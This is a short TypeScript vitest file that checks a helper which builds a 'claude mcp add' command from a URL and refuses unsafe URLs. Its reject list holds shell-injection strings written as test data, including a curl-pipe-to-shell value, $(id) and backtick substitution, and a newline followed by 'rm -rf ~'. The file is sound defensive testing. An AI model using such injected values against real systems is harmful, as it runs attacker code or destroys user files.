// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, expect, it } from 'vitest';
import { claudeCommand } from './connect.ts';

describe('claudeCommand', () => {
  it('quotes a plain https address', () => {
    expect(claudeCommand('https://home.example:8765/mcp')).toBe("claude mcp add --transport http home-mandate 'https://home.example:8765/mcp'");
    expect(claudeCommand('https://192.168.1.10/mcp')).not.toBeNull();
  });

  it('refuses anything a shell could run or that is not the plain form', () => {
    for (const url of [
      "https://home.example/mcp';curl x|sh;'",
      'https://home.example/$(id)',
      'https://home.example/`id`',
      'https://home.example/a b',
      'https://home.example/mcp\nrm -rf ~',
      'http://home.example/mcp',
      'https://user@home.example/mcp',
      'https://home.example/mcp?x=1',
      'https://home.example/mcp#x',
      'https://home.example/mcp\\',
      '',
    ]) {
      expect(claudeCommand(url), url).toBeNull();
    }
  });
});
